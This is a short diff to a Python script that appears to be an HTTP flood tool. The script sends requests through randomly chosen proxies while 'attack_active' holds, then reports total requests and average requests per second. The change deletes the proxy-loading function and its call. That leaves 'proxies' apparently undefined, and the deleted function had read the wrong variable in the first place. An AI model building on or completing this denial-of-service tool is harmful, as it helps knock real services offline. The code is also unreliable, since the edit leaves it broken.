@@ -54,21 +54,13 @@ acceptall = [
 
 attack_active = True
 requests_sent = 0
-def load_proxies(filename):
-    proxies = []
-    with open(out_file, "r") as f:
-        for line in f:
-            line = line.strip()
-            if line:
-                proxies.append(line)
-    return proxies
+
 
 def run():
     global requests_sent
     while attack_active:
         try:
             # اختيار بروكسي عشوائي
-            proxies = load_proxies("proxy.txt")
 
             proxy = random.choice(proxies)
             proxy_ip, proxy_port = proxy.split(":")
@@ -151,3 +143,4 @@ print(f"Total requests sent: {requests_sent}")
 print(f"Duration: {duration} seconds")
 print(f"Average RPS: {requests_sent/duration:.1f}")
 print("="*50)
+
